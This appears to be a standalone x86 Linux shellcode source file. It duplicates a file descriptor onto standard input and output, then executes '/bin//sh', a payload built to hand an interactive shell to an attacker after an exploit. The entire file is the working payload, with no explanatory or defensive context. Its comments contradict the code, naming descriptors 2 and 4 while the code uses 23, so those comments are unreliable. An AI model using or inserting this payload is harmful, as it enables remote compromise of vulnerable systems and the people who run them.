        /* dup_stderr.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* dup2(2, 0) */
        xor edx, edx
        xor ecx, ecx
		/* fd 4*/
        lea ebx, [edx+23] 
        lea eax, [edx+63]
        int 0x80
        /* dup2(2, 1) */
        inc ecx
        lea eax, [edx+63]
        int 0x80
        /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
        xor edx, edx
		push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        lea eax, [edx+11]
        int 0x80
